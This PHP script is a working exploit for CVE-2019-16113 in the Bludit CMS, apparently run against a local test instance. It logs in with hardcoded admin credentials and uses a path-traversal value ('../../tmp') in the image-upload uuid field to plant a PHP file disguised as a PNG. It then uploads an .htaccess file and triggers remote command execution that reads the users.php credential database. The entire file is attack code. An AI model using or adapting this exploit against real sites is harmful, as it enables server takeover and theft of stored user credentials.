<?php

declare(strict_types=1);

require_once __DIR__ . '/vendor/autoload.php';

use Monolog\Handler\StreamHandler;
use Monolog\Level;
use Monolog\Logger;
use Psr\Log\LoggerInterface;
use Symfony\Component\BrowserKit\HttpBrowser;
use Symfony\Component\HttpClient\HttpClient;
use Symfony\Contracts\HttpClient\HttpClientInterface;
use Symfony\Component\HttpFoundation\File\UploadedFile;

class BluditClient
{
    private HttpBrowser $browser;
    private HttpClientInterface $httpClient;
    private LoggerInterface $logger;

    private ?string $csrfToken = null;
    private ?string $sessionKey = null;
    private ?string $uuid = null;

    public function __construct(
        private readonly string $baseUrl,
    )
    {
        $this->httpClient = HttpClient::create([
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            ],
        ]);
        $this->browser = new HttpBrowser($this->httpClient);

        $this->logger = new Logger('bludit', [
            new StreamHandler('php://stdout', Level::Debug),
        ]);
    }

    public function exploit(): void
    {
        $this->login('admin', 'pass11');
        $this->newContent();
        $this->uploadExploitFile();
        $this->uploadHtaccess();
        $this->run();
    }

    public function login(string $username, string $password): string
    {
        $loginUrl = rtrim($this->baseUrl, '/') . '/admin/login';

        $crawler = $this->browser->request('GET', $loginUrl);
        $this->csrfToken = $crawler
            ->filter('input[name="tokenCSRF"]')
            ->attr('value');

        if ($this->csrfToken === null) {
            throw new \RuntimeException('CSRF token not found on login page.');
        }

        $this->browser->request(
            'POST',
            $loginUrl,
            [
                'tokenCSRF' => $this->csrfToken,
                'username' => $username,
                'password' => $password,
                'save' => '',
            ]
        );

        $crawler = $this->browser->getCrawler();
        $isAuthenticated = $crawler->filter('#dashboard')->count() > 0;

        if (false === $isAuthenticated) {
            throw new \RuntimeException('Login failed!');
        }

        $cookie = $this->browser->getCookieJar()->get('BLUDIT-KEY');
        if ($cookie === null) {
            throw new \RuntimeException('Session cookie BLUDIT-KEY not found.');
        }

        $this->sessionKey = $cookie->getValue();

        return $this->sessionKey;
    }

    public function uploadExploitFile(): void
    {
        if ($this->sessionKey === null || $this->csrfToken === null) {
            throw new \RuntimeException('Must be logged in before uploading files.');
        }

        $file = new UploadedFile(
            __DIR__ . '/exploit/CVE_2019_16113_exploit.php',
            'exploit_img.png',
            'image/png',
            null,
            true,
        );

        $crawler = $this->browser->request(
            'POST',
            rtrim($this->baseUrl, '/') . '/admin/ajax/upload-images',
            [
                //'uuid' => $this->uuid,
                'uuid' => '../../tmp',
                'tokenCSRF' => $this->csrfToken,
            ],
            [
                'images' => [$file],
            ],
            [
                'HTTP_ACCEPT' => '*/*',
                'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest',
                'HTTP_ORIGIN' => $this->baseUrl,
                'HTTP_REFERER' => $this->baseUrl . '/admin/new-content',
            ]
        );
    }

    private function uploadHtaccess(): void
    {
        if ($this->sessionKey === null || $this->csrfToken === null) {
            throw new \RuntimeException('Must be logged in before uploading files.');
        }

        $file = new UploadedFile(
            __DIR__ . '/exploit/.htaccess',
            '.htaccess',
            'image/png',
            null,
            true,
        );

        $crawler = $this->browser->request(
            'POST',
            rtrim($this->baseUrl, '/') . '/admin/ajax/upload-images',
            [
                'uuid' => $this->uuid,
                'tokenCSRF' => $this->csrfToken,
            ],
            [
                'images' => [$file],
            ],
            [
                'HTTP_ACCEPT' => '*/*',
                'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest',
                'HTTP_ORIGIN' => $this->baseUrl,
                'HTTP_REFERER' => $this->baseUrl . '/admin/new-content',
            ]
        );
    }

    private function newContent(): void
    {
        $newContent = rtrim($this->baseUrl, '/') . '/admin/new-content';

        $this->browser->request('GET', $newContent, [
            'Cookie' => 'BLUDIT-KEY=' . $this->sessionKey,
        ]);

        $crawler = $this->browser->getCrawler();

        $this->uuid = $crawler
            ->filter('input[name="uuid"]')
            ->attr('value');

        $this->logger->debug($this->uuid);

        $this->csrfToken = $crawler
            ->filter('input[name="tokenCSRF"]')
            ->attr('value');
    }

    public function run(): void
    {
        $url = rtrim($this->baseUrl, '/') . '/' . ltrim('/bl-content/tmp/exploit_img.png', '/');
        $url = $url . '?' . http_build_query([
                // 'cmd' => 'ls -lsa'
                'cmd' => 'cat ../../bl-content/databases/users.php'
            ]);

        $this->logger->info('Sending HTTP GET request', [
            'url' => $url,
        ]);

        $this->browser->request('GET', $url, [
            'cmd' => 'ls -lsa'
        ]);

        $response = $this->browser->getResponse();

        $this->logger->info('Response received', [
            'status' => $response->getStatusCode(),
            'content' => $response->getContent(),
        ]);
    }
}

$client = new BluditClient('http://localhost:8000');
$client->exploit();
